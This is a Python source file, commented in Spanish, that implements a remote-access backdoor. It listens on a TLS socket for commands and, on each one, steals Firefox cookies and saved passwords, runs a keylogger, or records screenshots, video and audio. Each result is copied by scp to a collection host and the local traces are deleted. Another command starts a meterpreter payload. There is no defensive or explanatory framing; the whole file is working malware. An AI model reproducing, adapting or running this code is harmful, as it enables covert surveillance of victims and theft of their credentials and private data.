
#importamos el modulo socket
import socket
import keylogger
import re, os, ssl
import capaudio
import captura
import capvideo

context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile="certificado.pem", keyfile="llave.pem")
#instanciamos un objeto para trabajar con el socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
#Con el metodo bind le indicamos que puerto debe escuchar y de que servidor esperar conexiones
#Es mejor dejarlo en blanco para recibir conexiones externas si es nuestro caso
s.bind(("", 6660))
 
#Aceptamos conexiones entrantes con el metodo listen, y ademas aplicamos como parametro
#El numero de conexiones entrantes que vamos a aceptar
s.listen(1)
 
#Instanciamos un objeto sc (socket cliente) para recibir datos, al recibir datos este 
#devolvera tambien un objeto que representa una tupla con los datos de conexion: IP y puerto
#sc, addr = s.accept()
 
sc, addr = s.accept()
connstream = context.wrap_socket(sc, server_side=True)
 
while True:
 
    #Recibimos el mensaje, con el metodo recv recibimos datos y como parametro 
    #la cantidad de bytes para recibir
    
	recibido = connstream.recv(1024)
 
    #Si el mensaje recibido es la palabra close se cierra la aplicacion
    #if recibido == "close":
    #    break
 
    #Si se reciben datos nos muestra la IP y el mensaje recibido
    #print str(addr[0]) + " dice: ", recibido
    
	if recibido == "cookies":
		os.system("python firecookies.py")	
		os.system('scp -q -o StrictHostKeyChecking=no /tmp/cookies.txt manavi@192.168.222.9:~/cookies/ 1>/dev/null')
		os.system('rm -f /tmp/cookies.txt')
		connstream.send("Archivo enviado")

	elif recibido == "contrasenas":
		os.system("python firepass.py")
		os.system('scp -q -o StrictHostKeyChecking=no /tmp/firepass.txt manavi@192.168.222.9:~/contrasenas/ 1>/dev/null')
		os.system('rm -f /tmp/firepass.txt')
		connstream.send("Archivo enviado")

	elif re.search('keylogger',recibido):
		mo = re.match('keylogger (\d+)',recibido)
		keylogger.keylog(mo.group(1))
		os.system('scp -q -o StrictHostKeyChecking=no /tmp/key.txt manavi@192.168.222.9:~/keylogger/ 1>/dev/null')
		os.system('rm -f /tmp/key.txt')
		connstream.send("Archivo enviado")
    
	elif re.search('captura',recibido):
		mo = re.match('captura (\-[tn]{1,1}) (\d+)',recibido);
		captura.tiempo(mo.group(1),mo.group(2))
		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.png manavi@192.168.222.9:~/capturas/ 1>/dev/null')
		os.system('rm -f /tmp/*.png')
		connstream.send("Archivo enviado")
 
	elif re.search('captvid',recibido):
		mo = re.match('captvid (\d+)',recibido);
		capvideo.video(mo.group(1))
		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.mpeg manavi@192.168.222.9:~/video/ 1>/dev/null')
		os.system('rm -f /tmp/*.avi')
		connstream.send("Archivo enviado")
    
	elif re.search('captaud',recibido):
		mo = re.match('captaud (\d+)',recibido);        
		capaudio.audio(mo.group(1))
		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.wav manavi@192.168.222.9:~/audio/ 1>/dev/null')
		os.system('rm -f /tmp/*.wav')
		connstream.send("Archivo enviado")

	elif recibido == "meterpreter":
		os.system("python meterpreter6666.py")
		connstream.send("Meterpreter Ejecutado")

    #Devolvemos el mensaje de error al cliente
	else :
		connstream.send("Ingrese un comando valido")
		recibido = ""
 
#Cerramos la instancia del socket cliente y servidor
connstream.close()
sc.close()
s.close()
